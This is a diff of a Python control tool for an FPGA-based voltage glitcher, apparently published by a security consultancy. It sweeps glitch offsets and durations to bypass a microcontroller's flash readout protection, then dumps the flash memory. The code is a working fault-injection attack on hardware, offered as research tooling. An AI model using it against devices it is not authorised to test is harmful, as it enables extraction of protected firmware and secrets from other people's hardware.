@@ -1,3 +1,57 @@
+#!/usr/bin/env python
+# -*- conding: utf-8 -*-
+
+"""
+  iCE, iCE Baby Glitcher
+
+  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)
+
+  Command tool for a simple FPGA-based voltage glitcher using a
+  Lattice Semiconductor iCEstick Evaluation Kit or an iCEBreaker FPGA
+
+  This glitcher is based on and inspired by glitcher implementations
+  by Dmitry Nedospasov (@nedos) from Toothless Consulting and
+  Grazfather (@Grazfather)
+
+  References:
+    http://www.latticesemi.com/icestick
+    https://www.crowdsupply.com/1bitsquared/icebreaker-fpga
+    https://github.com/toothlessco/arty-glitcher
+    https://toothless.co/blog/bootloader-bypass-part1/
+    https://toothless.co/blog/bootloader-bypass-part2/
+    https://toothless.co/blog/bootloader-bypass-part3/
+    https://github.com/Grazfather/glitcher
+    http://grazfather.github.io/re/pwn/electronics/fpga/2019/12/08/Glitcher.html
+
+  Copyright 2020, Matthias Deeg, SySS GmbH
+
+  Redistribution and use in source and binary forms, with or without
+  modification, are permitted provided that the following conditions are met:
+
+  1. Redistributions of source code must retain the above copyright notice,
+     this list of conditions and the following disclaimer.
+
+  2. Redistributions in binary form must reproduce the above copyright notice,
+     this list of conditions and the following disclaimer in the documentation
+     and/or other materials provided with the distribution.
+
+  3. Neither the name of the copyright holder nor the names of its contributors
+     may be used to endorse or promote products derived from this software
+     without specific prior written permission.
+
+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  POSSIBILITY OF SUCH DAMAGE.
+"""
+
 __version__ = '0.5'
 __author__ = 'Matthias Deeg'
 
@@ -192,9 +246,7 @@ class Glitcher():
         """Reset target device"""
 
         # send command
-        self.set_glitch_offset(0)
-        self.set_glitch_duration(2_000_000)
-        self.start_glitch()
+        self.dev.write(CMD_RESET)
 
     def set_glitch_duration(self, duration):
         """Send config command to set glitch duration in FPGA clock cycles"""
@@ -223,7 +275,7 @@ class Glitcher():
         with open(DUMP_FILE, "wb") as f:
 
             # read all 32 kB of flash memory
-            for i in range(1024):
+            for i in range(1023):
                 # first send "OK" to the target device
                 resp = self.send_target_command(OK, 1, True, b"\r\n")
 
@@ -243,57 +295,101 @@ class Glitcher():
     def run(self):
         """Run the glitching process with the current configuration"""
 
+        # # reset target
+        # self.reset_target()
+        #
+        # # read and show the UID of the target device
+        # print(fg.li_white + "[*] Read target device UID" + fg.rs)
+        # resp = self.send_target_command(b"N", 4, True, b"\r\n")
+        #
+        # if resp[0] == b"0" and len(resp) == 5:
+        #     uid = "{} {} {} {}".format(resp[4].decode("ascii"), resp[3].decode("ascii"), resp[2].decode("ascii"), resp[1].decode("ascii"))
+        # else:
+        #     uid = "<unknown>"
+        #     print(fg.li_red + "[-] Could not read target device UID" + fg.rs)
+        #
+        # # read part identification number
+        # print(fg.li_white + "[*] Read target device part ID" + fg.rs)
+        # resp = self.send_target_command(b"J", 1, True, b"\r\n")
+        #
+        # if resp[0] == b"0":
+        #     part_id = "{}".format(resp[1].decode("ascii"))
+        # else:
+        #     part_id = "<unknown>"
+        #     print(fg.li_red + "[-] Could not read target part ID" + fg.rs)
+        #
+        # # show target device info
+        # print(fg.li_white + "[*] Target device info:\n" +
+        #         "    UID:                        {}\n".format(uid) +
+        #         "    Part identification number: {}".format(part_id))
+        #
+        # print(fg.li_white + "[*] Press <ENTER> to start the glitching process" + fg.rs)
+        # input()
+
+        # measure the time
         start_time = datetime.now()
 
         for offset in range(self.start_offset, self.end_offset, self.offset_step):
+            # duration in 10 ns increments
             for duration in range(self.start_duration, self.end_duration, self.duration_step):
+                # better test more than once
                 for i in range(self.retries):
 
+                    # set glitch config
                     print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
-                    off1 = 0
-                    dur1 = 2_000_000
-                    self.set_glitch_offset(off1)
-                    self.set_glitch_duration(dur1)
-                    self.start_glitch()
-                    # 用第一段参数计算等待
-                    self.dev.write(CMD_PASSTHROUGH + b"\x00")
-                    print("20ms")
 
+                    
+                    
+                    self.set_glitch_offset(offset)
+                    self.set_glitch_duration(duration)
 
-                    # --- 第二段 glitch 参数 ---
-                    off2 = offset
-                    dur2 = duration
-                    self.set_glitch_offset(off2)
-                    self.set_glitch_duration(dur2)
+                    # start glitch (start the offset counter)
                     self.start_glitch()
-                    # 用第二段参数计算等待
-                    self.dev.write(CMD_PASSTHROUGH + b"\x00")
-                    print("2st")
+
+                    # reset target device
+                    self.reset_target()
+
+                    self.set_glitch_offset(0)
+                    self.set_glitch_duration(20_000_000)
+
+                    # start glitch (start the offset counter)
+                    self.start_glitch()
+
+                    # reset target device
+                    self.reset_target()
+
+                    # synchronize with target
+                    if not self.synchronize():
+                        print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
+                        continue
 
                     # read flash memory address
                     resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
 
                     if resp[0] == b"0":
+                        # measure the time again
                         end_time = datetime.now()
-                        print(ef.bold + fg.green +
-                              "[*] Glitching success!\n"
-                              f"    bypass with offset={offset}, duration={duration}\n"
-                              f"    time: {end_time - start_time}"
-                              + fg.rs)
 
+                        print(ef.bold + fg.green + "[*] Glitching success!\n"
+                                "    Bypassed the readout protection with the following glitch parameters:\n"
+                                "        offset   = {}\n        duration = {}\n".format(offset, duration) +
+                                "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)
+
+                        # save successful glitching configuration in file
+                        config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
                         with open(RESULTS_FILE, "a") as f:
-                            f.write(f"{offset},{duration},0,{resp[1]}\n")
+                            f.write(config)
 
+                        # dump memory
                         print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
                         self.dump_memory()
+
                         return True
 
                     elif resp[0] != b"19":
-                        print(fg.li_red + f"[?] Unexpected response: {resp}" + fg.rs)
+                        print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)
 
         return False
-
-
 
 
 def banner():
